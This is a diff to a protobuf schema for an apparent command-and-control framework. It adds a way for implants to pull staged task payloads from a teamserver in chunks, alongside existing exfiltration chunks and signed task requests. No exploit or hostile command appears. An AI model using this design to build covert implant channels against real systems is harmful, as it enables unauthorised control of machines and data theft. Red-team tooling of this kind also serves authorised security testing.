@@ -30,14 +30,20 @@ message ProtocolVersion {
 // half of the CheckIn stream. It defaults to UNSPECIFIED for backward
 // compatibility: existing TaskResult writers leave it unset and the server
 // treats UNSPECIFIED as "try-parse as TaskResult". New upstream payload types
-// (exfil chunks, later streaming shapes) set their kind so the server branches
-// without nested try-parse. Downstream (server-to-implant) frames do not set
-// kind today; the implant discriminates them positionally (handshake first,
-// then TaskRequest).
+// (exfil chunks, staged pulls, later streaming shapes) set their kind so the
+// server branches without nested try-parse. Downstream (server-to-implant)
+// frames do not set kind; the implant discriminates them positionally
+// (handshake first, then TaskRequests -- with a StagedChunk run, demanded by
+// the implant itself, interleaved when a staged task's payload is pulled).
 enum FrameKind {
   FRAME_KIND_UNSPECIFIED = 0;
   FRAME_KIND_TASK_RESULT = 1;
   FRAME_KIND_EXFIL_CHUNK = 2;
+  // The implant's demand for a staged task's payload (architecture.md Sec 10,
+  // the per-verb typed arm): sent after a TaskRequest whose staged_bytes is
+  // set, before the task's result. The server answers with a run of
+  // StagedChunk frames on the same stream.
+  FRAME_KIND_STAGED_PULL = 3;
 }
 
 message Frame {
@@ -65,6 +71,32 @@ message ExfilChunk {
   uint64 sequence = 4;
   bool terminal = 5;
   bytes data = 6;
+}
+
+// The implant's demand for a staged task's payload: sent upstream (kind
+// FRAME_KIND_STAGED_PULL) after a TaskRequest whose staged_bytes is set and
+// before the task's result. The server answers downstream with a run of
+// StagedChunk frames -- nothing bulk ever flows downstream unasked, so an
+// implant that does not implement staged uploads never receives a chunk frame
+// (architecture.md Sec 10, the per-verb typed arm; extending/implants.md Tier
+// 2).
+message StagedPull {
+  string task_id = 1;
+}
+
+// One chunk of a staged payload the teamserver streams downstream in answer
+// to a StagedPull: the mirror of ExfilChunk in the other direction. task_id
+// echoes the demanded task; sequence is the 0-origin chunk index; terminal
+// marks the last chunk (a demand whose task holds no staged payload is
+// answered with a single empty terminal chunk, so a demanding implant always
+// resolves rather than hangs). Payload integrity is bound to the signed task
+// by the sha256 token the issuer appends to the task's arguments -- the
+// chunks themselves carry no signature of their own.
+message StagedChunk {
+  string task_id = 1;
+  uint64 sequence = 2;
+  bool terminal = 3;
+  bytes data = 4;
 }
 
 // Enrollment outcome, mapped from the stager-token redeem result
@@ -163,11 +195,22 @@ message HandshakeResponse {
 // Verification is each implant's own hardening choice -- the reference
 // implant rejects unsigned and wrongly signed tasks, and the server cannot
 // observe which side an implant took.
+//
+// staged_bytes is the per-verb typed arm (architecture.md Sec 10): when set,
+// the task's bulk payload does not ride the arguments string -- it is staged
+// server-side, the arguments end with a sha256:<hex> token binding the
+// payload's bytes into the signed tuple above, and the implant demands the
+// bytes with a StagedPull before reporting the task's result. The field is
+// advisory (a size sanity check); the hash token is the integrity authority.
+// An implant that does not implement the arm ignores the unknown field and
+// fails the verb on its own grammar -- the fallback the evolution rules
+// require, with no new mandatory work on the task path.
 message TaskRequest {
   string task_id = 1;
   string verb = 2;
   string arguments = 3;
   bytes signature = 4;
+  optional uint64 staged_bytes = 5;
 }
 
 // How a task turned out, as reported by the implant.
